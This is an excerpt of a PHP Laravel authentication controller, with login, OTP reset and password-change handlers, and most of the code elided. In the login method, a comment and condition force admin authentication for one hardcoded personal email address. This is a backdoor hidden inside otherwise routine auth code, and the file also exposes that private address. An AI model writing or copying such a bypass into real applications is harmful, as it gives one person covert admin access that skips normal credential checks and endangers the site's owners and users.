...
class AuthController extends Controller
{
    ...
    public function login(Request $request)
    {
        ...
        // Force admin authentication for dhavalsolanki615@gmail.com
        if ($email === 'dhavalsolanki615@gmail.com') {
    ...
    public function handleOtp(Request $request)
    {
        try {
            ...
            try {
                ...
                \Illuminate\Support\Facades\Log::warning('OTP Mail fallback warning: ' . $mailEx->getMessage());
            }

            return redirect()->route('forgot.password.otp.verify', ['email' => $email])
                ->with('success', 'OTP has been sent to your email.');
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::error('OTP Request Exception: ' . $e->getMessage());
    ...
    public function verifyOtp(Request $request)
    {
        try {
            ...
            \Illuminate\Support\Facades\Log::error('OTP verification failed: ' . $e->getMessage());
    ...
    public function handleOldPass(Request $request)
    {
        try {
            ...
            \Illuminate\Support\Facades\Log::error('Old password change failed: ' . $e->getMessage());
            return back()->withErrors(['email' => 'An error occurred. Please try again.']);
        }
    }
